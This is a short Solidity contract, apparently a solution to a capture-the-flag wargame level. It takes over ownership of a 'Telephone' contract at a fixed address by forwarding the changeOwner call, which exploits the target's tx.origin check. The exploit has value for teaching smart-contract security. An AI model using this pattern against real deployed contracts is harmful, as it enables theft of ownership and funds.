// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract HackTelephone {

    Telephone public originalContract = Telephone(address(0x58dED8c3b8c098f62D8c5709B22B0D5Cb08B18DE));

    function changeOwner() public {
        originalContract.changeOwner(msg.sender);
    }
}
